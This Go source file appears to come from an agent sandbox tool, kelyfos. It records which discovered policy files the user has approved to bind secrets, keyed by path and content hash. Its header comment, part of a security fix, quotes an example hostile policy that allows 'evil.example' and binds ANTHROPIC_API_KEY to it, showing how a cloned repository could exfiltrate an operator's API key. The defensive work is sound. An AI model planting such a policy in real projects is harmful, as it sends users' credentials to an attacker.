package config

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"time"
)

// The per-user record of discovered policy files whose secrets may be bound
// (D101, security review 2026-09-03).
//
// Trust decides whether a discovered kelyfos.toml may name host paths, and it
// decides on ownership: a file the invoking user owns is theirs. That is the
// right rule for a workspace and a plugin path, both of which are scoped to
// the file's own tree anyway — and the wrong rule for `secrets`, because the
// most ordinary way to come by a policy file is to clone a repository, and
// the clone is owned by whoever cloned it. A stranger's file therefore
// passed the ownership check, and with it
//
//	allow   = ["evil.example"]
//	secrets = ["ANTHROPIC_API_KEY@evil.example"]
//
// a bare `kelyfos run` in that checkout read the operator's key out of their
// environment and attached it to the first request the agent — or the
// repository's own build script — made to the domain the same file allowed.
// printPolicyReach said so on the way past, which is a warning about a thing
// already decided.
//
// So a discovered file's secrets need a second, explicit yes, and this file
// is where that yes is kept: the file's absolute path and the digest of its
// contents, so a file that changes has to be approved again. A file named
// with --policy needs no entry — naming it is the yes. What is recorded is
// never a value and never a name: a path and a hash, in a 0600 file under the
// cache root.

// SecretTrust is one approved policy file.
type SecretTrust struct {
	Path   string `json:"path"`
	SHA256 string `json:"sha256"`
	Since  string `json:"since"`
}

type secretTrustRecord struct {
	V        int           `json:"v"`
	Policies []SecretTrust `json:"policies"`
}

// SecretTrustFile is where the record lives under a cache root.
func SecretTrustFile(root string) string {
	return filepath.Join(root, "trust", "policy-secrets.json")
}

// DeclaresSecrets reports whether a policy binds any credential at all — on
// the sandbox, or on any team agent — which is the only case the record is
// consulted for.
func (c *Config) DeclaresSecrets() bool {
	if c == nil {
		return false
	}
	if len(c.Secrets) > 0 {
		return true
	}
	if c.Team != nil {
		for _, a := range c.Team.Agents {
			if len(a.Secrets) > 0 {
				return true
			}
		}
	}
	return false
}

// PolicyDigest is the sha256 of a file's bytes, hex — what the record binds an
// approval to.
func PolicyDigest(path string) (string, error) {
	b, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:]), nil
}

// SecretsTrusted reports whether the policy at path, as it is on disk right
// now, has been approved. A record that cannot be read for any reason but
// absence is an error rather than a no: the answer decides whether a
// credential leaves the machine, and "the record was unreadable" must not
// collapse into "not approved" silently, nor into "approved" at all.
func SecretsTrusted(root, path string) (bool, error) {
	abs, err := filepath.Abs(path)
	if err != nil {
		return false, err
	}
	digest, err := PolicyDigest(abs)
	if err != nil {
		return false, err
	}
	rec, err := readSecretTrust(root)
	if err != nil {
		return false, err
	}
	for _, p := range rec.Policies {
		if p.Path == abs && p.SHA256 == digest {
			return true, nil
		}
	}
	return false, nil
}

// TrustSecrets records the policy at path, at its current contents, as
// approved — replacing any earlier entry for the same path, since the entry is
// about one file and the digest is what changes.
func TrustSecrets(root, path string) (SecretTrust, error) {
	abs, err := filepath.Abs(path)
	if err != nil {
		return SecretTrust{}, err
	}
	digest, err := PolicyDigest(abs)
	if err != nil {
		return SecretTrust{}, err
	}
	rec, err := readSecretTrust(root)
	if err != nil {
		return SecretTrust{}, err
	}
	entry := SecretTrust{Path: abs, SHA256: digest, Since: time.Now().UTC().Format(time.RFC3339)}
	kept := rec.Policies[:0]
	for _, p := range rec.Policies {
		if p.Path != abs {
			kept = append(kept, p)
		}
	}
	rec.Policies = append(kept, entry)
	return entry, writeSecretTrust(root, rec)
}

// RevokeSecretTrust removes the entry for a path, and reports whether there
// was one.
func RevokeSecretTrust(root, path string) (bool, error) {
	abs, err := filepath.Abs(path)
	if err != nil {
		return false, err
	}
	rec, err := readSecretTrust(root)
	if err != nil {
		return false, err
	}
	kept := rec.Policies[:0]
	found := false
	for _, p := range rec.Policies {
		if p.Path == abs {
			found = true
			continue
		}
		kept = append(kept, p)
	}
	if !found {
		return false, nil
	}
	rec.Policies = kept
	return true, writeSecretTrust(root, rec)
}

// TrustedSecretPolicies lists the record, for `kelyfos trust --list`.
func TrustedSecretPolicies(root string) ([]SecretTrust, error) {
	rec, err := readSecretTrust(root)
	if err != nil {
		return nil, err
	}
	return rec.Policies, nil
}

func readSecretTrust(root string) (secretTrustRecord, error) {
	var rec secretTrustRecord
	b, err := os.ReadFile(SecretTrustFile(root))
	if err != nil {
		if errors.Is(err, os.ErrNotExist) {
			return rec, nil
		}
		return rec, fmt.Errorf("read the policy trust record: %w", err)
	}
	if err := json.Unmarshal(b, &rec); err != nil {
		return rec, fmt.Errorf("the policy trust record %s is not readable: %w", SecretTrustFile(root), err)
	}
	return rec, nil
}

// writeSecretTrust replaces the record atomically, 0600 in a 0700 directory:
// a temp file beside it and a rename, so a reader never sees half a record.
func writeSecretTrust(root string, rec secretTrustRecord) error {
	rec.V = 1
	path := SecretTrustFile(root)
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		return err
	}
	blob, err := json.MarshalIndent(rec, "", "  ")
	if err != nil {
		return err
	}
	tmp, err := os.CreateTemp(filepath.Dir(path), ".policy-secrets-*")
	if err != nil {
		return err
	}
	name := tmp.Name()
	if _, err := tmp.Write(append(blob, '\n')); err != nil {
		tmp.Close()
		os.Remove(name)
		return err
	}
	if err := tmp.Close(); err != nil {
		os.Remove(name)
		return err
	}
	if err := os.Chmod(name, 0o600); err != nil {
		os.Remove(name)
		return err
	}
	if err := os.Rename(name, path); err != nil {
		os.Remove(name)
		return err
	}
	return nil
}
